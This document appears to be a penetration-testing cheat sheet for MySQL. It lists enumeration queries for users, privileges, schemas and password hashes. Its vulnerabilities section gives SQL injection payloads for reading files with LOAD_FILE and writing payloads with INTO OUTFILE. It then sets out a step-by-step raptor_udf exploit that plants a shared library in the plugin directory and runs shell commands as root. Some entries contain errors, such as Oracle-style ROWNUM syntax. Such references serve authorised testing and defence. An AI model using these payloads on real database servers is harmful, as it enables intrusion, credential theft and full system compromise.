# MySQL

## Database commands

### Comments

```
SELECT 1; #comment
SELECT /*comment*/1;
```

### Version

```
SELECT @@version
```

### Users

```
SELECT user();
SELECT system_user();
SELECT user FROM mysql.user; -- priv
CREATE USER <name> IDENTIFIED BY '<pass>'; 
DROP USER <name>; 
GRANT ALL PRIVILEGES ON *.* TO <name>@'%';
SELECT grantee, privilege_type, is_grantable FROM information_schema.user_privileges WHERE privilege_type = 'SUPER';
SELECT host, user FROM mysql.user WHERE Super_priv = 'Y';
```

### Privileges

```
SELECT grantee, privilege_type, is_grantable FROM information_schema.user_privileges;
SELECT host, user, Select_priv, Insert_priv, Update_priv, Delete_priv, Create_priv, Drop_priv, Reload_priv, Shutdown_priv, Process_priv, File_priv, Grant_priv, References_priv, Index_priv, Alter_priv, Show_db_priv, Super_priv, Create_tmp_table_priv, Lock_tables_priv, Execute_priv, Repl_slave_priv, Repl_client_priv FROM mysql.user;
SELECT grantee, table_schema, privilege_type FROM information_schema.schema_privileges
SELECT table_schema, table_name, column_name, privilege_type FROM information_schema.column_privileges;
```

### Database info

```
SELECT database()
SELECT schema_name FROM information_schema.schemata; -- for MySQL >= v5.0
SELECT distinct(db) FROM mysql.db;
SELECT @@datadir;
```

### List tables

```
SELECT table_schema,table_name FROM information_schema.tables WHERE table_schema != 'mysql' AND table_schema != 'information_schema';
```

### List columns

```
SELECT table_schema, table_name, column_name FROM information_schema.columns WHERE table_schema != 'mysql' AND table_schema != 'information_schema';
```

### Filter table by column name

```
SELECT table_schema, table_name FROM information_schema.columns WHERE column_name = ‘’;
```

### Access nth row

```
SELECT username FROM (SELECT ROWNUM r, username FROM all_users ORDER BY username) WHERE r=<nth>;
```

### String operations

```
SELECT substr('<string>', <start>, <end>); # returns c
SELECT char(65); # returns A
SELECT ascii('A'); # returns 65
SELECT 0×414243; # returns ABC
Casting	SELECT cast('1' AS unsigned integer);
SELECT cast('123' AS char);
SELECT CONCAT('A','B','C');
```

### Conditional execution

```
SELECT if(1=1,'foo','bar');
SELECT CASE WHEN (1=1) THEN 'A' ELSE 'B' END;	
```

### Time delay

```
SELECT BENCHMARK(1000000,MD5('A'));
SELECT SLEEP(<seconds>); # >= 5.0.12
```

### Hostname

```
SELECT @@hostname;
```

## Passwords

```
SELECT host, user, password FROM mysql.user; --priv
```

**Format:** SQL

## Vulnerabilities

### Arbitrary file access

```
…' UNION ALL SELECT LOAD_FILE('<readable file>');    #SQLi
```

### Arbitrary file write

```
SELECT * FROM mytable INTO <name> '<path to name>';
UNION SELECT ("<payload>") INTO OUTFILE '<path> '  -- -'
```

### Local code execution (raptor\_udf)

Useful if the database is run with root privileges and you know the credentials. Get payload from [https://www.exploit-db.com/exploits/1518](https://www.exploit-db.com/exploits/1518) compile and transfer it to target machine.

1. Login with root credentials `mysql -u root -p <pass>`
2. Find plugin directory `select @@plugin_dir;`
3. Load payload in memory`use mysql;create table foo(line blob);insert into foo values(load_file('<path to payload>'));`
4. Write payload in plugin folder `select * from foo into dumpfile '<plugin folder>/raptor_udf2.so';`
5. Create a function to invoke the payload `create function do_system returns integer soname 'raptor_udf2.so';`
6. Execute commands as root `select do_system("<bash command>");`

